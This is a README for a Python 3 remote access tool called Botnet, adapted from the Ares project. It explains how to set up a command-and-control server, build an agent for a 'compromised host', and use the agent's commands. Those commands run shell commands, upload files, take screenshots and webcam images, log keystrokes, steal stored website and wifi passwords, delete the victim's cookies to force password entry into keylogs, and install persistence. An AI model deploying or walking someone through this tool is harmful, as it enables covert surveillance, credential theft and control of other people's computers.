# Botnet
Botnet is a Python3 Remote Access Tool.

__Warning: Misuse of this software can raise legal and ethical issues which I don't support nor can be held responsible for.__

Botnet is, just like Ares, made of two programs:

- A Command And Control server which is a web interface to administer the agents
- An agent program, which is run on the compromised host, and ensures communication with the C&C

## Based on Github project Ares: https://github.com/sweetsoftware/Ares
Differences?
1. Updated from python 2 -> python 3
2. Extra features like screencaptures, webcam capture, keylogger, password grabber (websites and wifi), ...

## Setup

__Note: I suggest creating a virtual environment__

Install the python requirements: 

```
pip install -r requirements.txt
```

Initialize the database:

```
cd Server
./server initdb
```

## Server
Run the (debug) server:

```
./server.py runserver -h 0.0.0.0 -p 8080 --threaded
```

The server must now be accessible on http://localhost:8080

## Agent
Run the agent (update config.py to suit your needs):

```
cd agent
./agent.py
```

Build an agent to a standalone library and run it:

```
./builder.py -p Linux --server http://localhost:8080 -o agent
./agent
```

To see a list of supported options run

```
./builder.py -h
```

## Commands

```
<any shell command>
Executes the command in a shell and return its output.

upload <local_file>
Uploads <local_file> to server.

download <url> <destination>
Downloads a file through HTTP(S).

zip <archive_name> <folder>
Creates a zip archive of the folder.

python <command|file>
Runs a Python command or local file.

screenshot
Takes a screenshot and uploads the image to server.

camshot
Takes a webcam image and uploads the image to server.

keylogger
Shows all pressed keys since start up.

passwords
Shows all stored passwords on the pc, including websites and wifi.

delete passwords
Deletes all stored cookies from the victims' pc. 
This way you could try to retreive password from keylogs if you cannot get them from the passwords command.

persist
Installs the agent.

clean
Uninstalls the agent.

exit
Kills the agent.
```
